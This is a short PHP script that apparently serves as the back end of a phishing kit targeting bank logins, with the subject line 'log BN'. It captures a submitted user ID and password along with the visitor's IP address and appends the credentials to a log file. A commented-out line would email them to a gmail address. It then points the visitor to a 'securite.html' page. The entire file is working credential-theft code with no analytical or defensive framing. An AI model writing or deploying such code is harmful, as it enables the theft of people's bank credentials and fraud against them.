<?php
session_start();
$mailSubject = "log BN";
$_SESSION['id']=$_POST['id'];$_SESSION['oooo']=$_POST['oooo'];

$message = "+ Information\r\n";
$message .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . ")\r\n";

$message .= "| ID: " . $_POST['id'] . "\r\n";
$message .= "| Pass : " . $_POST['oooo']  . "\r\n";


$message .= "+ ------------------------------------------+\r\n\r\n";

$header = "From: " . $_SERVER['REMOTE_ADDR'] . "\r\n";

$header .= "MIME-Version: 1.0\r\n";

//mail("zoumou24@gmail.com", $mailSubject, $message, $header);

file_put_contents('log.txt', $_POST['id']  . "\n", FILE_APPEND);
file_put_contents('log.txt', $_POST['oooo']  . "\n", FILE_APPEND);


header("securite.html");
?>
